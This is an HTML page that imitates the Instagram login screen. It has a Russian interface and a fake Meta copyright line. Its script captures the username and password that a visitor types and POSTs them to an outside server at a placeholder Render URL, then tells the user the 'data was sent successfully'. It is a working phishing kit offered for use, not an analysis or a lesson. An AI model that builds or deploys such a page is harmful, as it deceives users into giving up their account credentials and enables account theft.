<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="./instagram.png">
    <style>
         @font-face {
            font-family: 'AbrilFatface-Regular';
            src: url('fonts/AbrilFatface-Regular.ttf') format('truetype');
        }

        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fafafa;
        }
        .login-container {
            width: 300px;
            padding: 20px;
            border: 1px solid #dbdbdb;
            background-color: #fff;
            text-align: center;
        }

        .login-container h1 {
            font-family: 'AbrilFatface-Regular', cursive;
            font-size: 40px;
            font-weight: normal;
            margin-bottom: 20px;
        }

        .login-container input {
            width: 250PX;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
        }
        .login-container button {
            width: 250PX;
            margin-top: 15px;
            padding: 10px;
            background-color: #3897f0;
            border: none;
            border-radius: 3px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
        }
        .login-container .forgot {
            text-align: center;

            /* margin: 10px 0; */
            /* margin-right: 25px;
            margin-top: -30px; */
        }
        .login-container .forgot a {
            color: rgb(0, 55, 107, 1);
            text-decoration: none;
        }
        .login-container .or {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .login-container .or div {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .login-container .or span {
            margin: 0 10px;
            color: #8e8e8e;
            font-weight: bold;
        }
        .login-container .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: rgb(0, 149, 246, 1);
            font-weight: bold;
            text-decoration: none;
            margin: 10px 0;
        }

        .login-container img {
            width: 20px;
            height: 20px;
            vertical-align: middle;
            margin-right: 15px;}

        .login-container .facebook-login img {
            margin-right: 10px;
        }
        .login-container .signup {
            margin-top: 20px;
        }
        .login-container .signup a {
            color: rgb(0, 149, 246, 1);
            text-decoration: none;
        }


        
        .app-links {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 10px;
        }
        .app-links img {
            width: 135px;
            height: auto;
            margin-right: 5px;
            margin-top: 10px;
        }
        .app-links .app_store{
            width: 155px;
            height: auto;

        }

        .copy{
            position: fixed;
            bottom: 0;
            width: 100%;

            display: flex;
            justify-content: center;
            align-items: center;
        }
        .copy h6{
            font-family: Helvetica, Arial, sans-serif;
            color: #1c1e21;
            font-size: 12px;
            font-weight: normal;

            margin: 0 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
    <form id="loginForm">
            <h1>Instagram</h1>
            <input type="text" name="username" placeholder="Телефон, имя пользователя или эл...." required>
            <input type="password" name="password" placeholder="Пароль" required>
            <button type="submit">Войти</button>
    </form>

    </div>

    <div class="app-links">
        <a href="https://play.google.com/store">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/512px-Google_Play_Store_badge_EN.svg.png" alt="Доступно в Google Play">
        </a>
        <a href="https://apps.apple.com/app">
            <img src="./png-transparent-app-store-edfest-apple-mobile-app-ios-apple-text-label-rectangle-removebg-preview.png" class="app_store" alt="Загрузите в App Store">                
        </a>
    </div>

    <div class="copy">
        <h6>Русский</h6>
        <h6>© 2025 Instagram from Meta</h6>

    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = e.target.username.value;
            const password = e.target.password.value;

            try {
                const response = await fetch('https://your-render-app.onrender.com/send', { // Заменим URL после настройки Render
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ username, password })
                });

                if (response.ok) {
                    alert('Данные успешно отправлены!');
                } else {
                    alert('Ошибка при отправке данных!');
                }
            } catch (error) {
                console.error('Ошибка:', error);
                alert('Произошла ошибка!');
            }
        });
    </script>
</body>
</html>
